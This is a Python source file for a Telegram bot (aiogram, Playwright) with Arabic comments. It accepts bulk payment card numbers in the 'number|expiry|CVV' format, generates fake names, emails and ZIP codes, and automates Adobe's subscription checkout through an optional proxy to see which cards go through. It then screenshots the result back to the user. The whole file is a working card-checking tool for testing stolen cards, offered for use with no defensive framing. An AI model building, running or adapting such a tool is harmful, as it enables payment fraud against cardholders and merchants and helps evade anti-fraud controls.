import asyncio
import os
import random
import string
import re
from aiogram import Bot, Dispatcher
from aiogram.filters import Command
from aiogram.types import Message, FSInputFile
from playwright.async_api import async_playwright

BOT_TOKEN = os.getenv("BOT_TOKEN")

if not BOT_TOKEN:
    raise ValueError("⚠️ التوكن غير موجود! تأكد من إضافته في إعدادات Variables في Railway.")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# إنشاء طابور مهام عالمي
card_queue = asyncio.Queue()

ADOBE_URL = "https://commerce.adobe.com/store/checkout?items%5B0%5D%5Bid%5D=D0440AB0F2F7F2F2CB39657F45BC5D56&items%5B0%5D%5Bq%5D=1&cli=creative&co=US&lang=en"

def generate_random_data():
    first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles", "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth", "Barbara", "Susan", "Jessica", "Sarah", "Karen"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin"]
    zip_codes = ["10001", "90210", "60601", "73301", "33101", "94105", "98101", "02108", "30301", "75201"]
    
    fname = random.choice(first_names)
    lname = random.choice(last_names)
    zip_code = random.choice(zip_codes)
    
    random_chars = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
    email = f"nabeel886ADOBEVV44{random_chars}@gmail.com"
    
    return email, fname, lname, zip_code

async def automate_adobe_checkout(chat_id, data: dict):
    # استخدام آخر 4 أرقام من البطاقة لتمييز الرسائل
    last_4 = data['card'][-4:]
    
    await bot.send_message(
        chat_id, 
        f"⏳ **جاري فحص البطاقة تنتهي بـ {last_4}**\n"
        f"📧 الإيميل: `{data['email']}`\n"
        f"👤 الاسم: {data['fname']} {data['lname']}",
        parse_mode="Markdown"
    )
    
    async with async_playwright() as p:
        proxy_server = os.getenv("PROXY_SERVER")
        proxy_username = os.getenv("PROXY_USERNAME")
        proxy_password = os.getenv("PROXY_PASSWORD")
        
        proxy_settings = None
        if proxy_server:
            proxy_settings = {"server": proxy_server}
            if proxy_username and proxy_password:
                proxy_settings["username"] = proxy_username
                proxy_settings["password"] = proxy_password

        browser = await p.chromium.launch(
            headless=True,
            args=['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
        )
        
        context = await browser.new_context(
            viewport={'width': 1440, 'height': 900},
            proxy=proxy_settings
        )
        page = await context.new_page()
        
        screenshot_path = f"result_{chat_id}_{last_4}.png"
        error_img = f"error_{chat_id}_{last_4}.png"
        
        try:
            await page.goto(ADOBE_URL, wait_until="domcontentloaded", timeout=60000)
            await page.locator('input[type="email"]').wait_for(state="visible", timeout=30000)

            # الخطوة 1: الإيميل
            await page.locator('input[type="email"]').type(data['email'], delay=100)
            await page.locator('button:has-text("Continue")').click()
            
            # دالة قناصة متقدمة تبحث في كل الخصائص والإطارات
            async def smart_type(hints, value):
                for _ in range(15):
                    frames_to_check = [page] + page.frames
                    for f in frames_to_check:
                        for hint in hints:
                            selector = f'input[name*="{hint}" i], input[placeholder*="{hint}" i], input[aria-label*="{hint}" i], input[id*="{hint}" i], input[data-fieldtype*="{hint}" i]'
                            loc = f.locator(selector)
                            count = await loc.count()
                            
                            for i in range(count):
                                target = loc.nth(i)
                                if await target.is_visible():
                                    try:
                                        try:
                                            await target.click(timeout=1000)
                                        except:
                                            await target.focus(timeout=1000)
                                            
                                        await target.fill("")
                                        await target.type(value, delay=100)
                                        return
                                    except:
                                        continue 
                    await page.wait_for_timeout(1000)
                raise Exception(f"لم يتم العثور على الحقل المرتبط بـ: {hints[0]}")

            # الخطوة 2: بيانات الدفع 
            await page.wait_for_timeout(3000)
            
            await smart_type(["cardnumber", "card number", "ccnumber", "encryptedcard", "credit"], data['card'])
            await smart_type(["expiry", "expiration", "mm/yy", "date", "encryptedexpiry"], data['expiry'])

            # الخطوة 3: البيانات الشخصية
            await smart_type(["first name", "firstname", "fname"], data['fname'])
            await smart_type(["last name", "lastname", "lname"], data['lname'])
            await smart_type(["zip", "postal", "postcode"], data['zip'])

            await page.mouse.wheel(0, 500)
            await page.wait_for_timeout(1000)
            
            # الخطوة 4: تأكيد الاشتراك
            await page.locator('button:has-text("Agree and subscribe")').click()
            
            await page.wait_for_timeout(6000)
            
            await page.screenshot(path=screenshot_path)
            photo = FSInputFile(screenshot_path)
            await bot.send_photo(chat_id, photo, caption=f"🎉 **النتيجة للبطاقة {last_4}:**", parse_mode="Markdown")
            
        except Exception as e:
            await page.screenshot(path=error_img)
            photo = FSInputFile(error_img)
            error_msg = str(e).split('\n')[0] 
            
            await bot.send_photo(
                chat_id, 
                photo, 
                caption=f"❌ **توقف البوت عند البطاقة {last_4}!**\n\nتفاصيل الخطأ:\n`{error_msg}`",
                parse_mode="Markdown"
            )
            
        finally:
            await browser.close()
            if os.path.exists(screenshot_path):
                os.remove(screenshot_path)
            if os.path.exists(error_img):
                os.remove(error_img)

# عامل الخلفية (Worker) الذي يسحب البطاقات من الطابور ويعالجها بالترتيب
async def queue_worker():
    while True:
        chat_id, user_data = await card_queue.get()
        try:
            await automate_adobe_checkout(chat_id, user_data)
        except Exception as e:
            print(f"Error processing card: {e}")
        finally:
            # إعلام الطابور بانتهاء المهمة وإعطاء فترة راحة 3 ثواني قبل البطاقة التالية
            card_queue.task_done()
            await asyncio.sleep(3)

@dp.message(Command("start"))
async def send_welcome(message: Message):
    await message.reply(
        "مرحباً بك.\n"
        "أرسل لي بيانات الدفع بأي تنسيق وسأقوم بفلترتها.\n\n"
        "يمكنك إرسال بطاقة واحدة، أو مجموعة بطاقات (كل بطاقة في سطر).\n\n"
        "أمثلة مدعومة:\n"
        "`4938 7506 7122 3872|0731`\n"
        "`4938750671223872|07|31|123`\n"
        "`4938750671223872|07/31|123`",
        parse_mode="Markdown"
    )

@dp.message()
async def process_data(message: Message):
    lines = message.text.strip().split('\n')
    added_count = 0
    
    for line in lines:
        if not line.strip(): 
            continue
            
        parts = line.split('|')
        if len(parts) < 2:
            continue
            
        # استخراج الأرقام فقط من الجزء الأول (رقم البطاقة)
        card_clean = re.sub(r'\D', '', parts[0])
        
        # استخراج التاريخ بذكاء
        part2 = re.sub(r'\D', '', parts[1])
        
        if len(part2) == 4:
            # تنسيق 0731
            expiry_clean = part2
        elif len(part2) == 2 and len(parts) >= 3:
            # تنسيق 07|31|CVV
            part3 = re.sub(r'\D', '', parts[2])
            if len(part3) == 4: # سنة كاملة مثل 2031
                expiry_clean = part2 + part3[-2:]
            elif len(part3) == 2: # سنة مختصرة مثل 31
                expiry_clean = part2 + part3
            else:
                expiry_clean = part2 # احتياطي
        else:
            expiry_clean = part2
            
        # التأكد من صحة طول البطاقة والتاريخ قبل الإضافة
        if len(card_clean) < 13 or len(expiry_clean) < 4:
            continue
            
        rand_email, rand_fname, rand_lname, rand_zip = generate_random_data()
        
        user_data = {
            'email': rand_email,
            'card': card_clean,
            'expiry': expiry_clean[:4], # التأكد من أخذ 4 أرقام فقط (شهر وسنة)
            'fname': rand_fname,
            'lname': rand_lname,
            'zip': rand_zip
        }
        
        # إضافة البطاقة للطابور
        await card_queue.put((message.chat.id, user_data))
        added_count += 1
        
    if added_count > 0:
        await message.reply(f"✅ تم بنجاح إضافة **{added_count}** بطاقة إلى الطابور.\nسيتم الفحص واحدة تلو الأخرى.", parse_mode="Markdown")
    else:
        await message.reply("⚠️ لم يتم العثور على بطاقات بتنسيق صحيح في رسالتك.")

async def main():
    print("Bot is starting...")
    # تشغيل عامل الطابور في الخلفية
    asyncio.create_task(queue_worker())
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
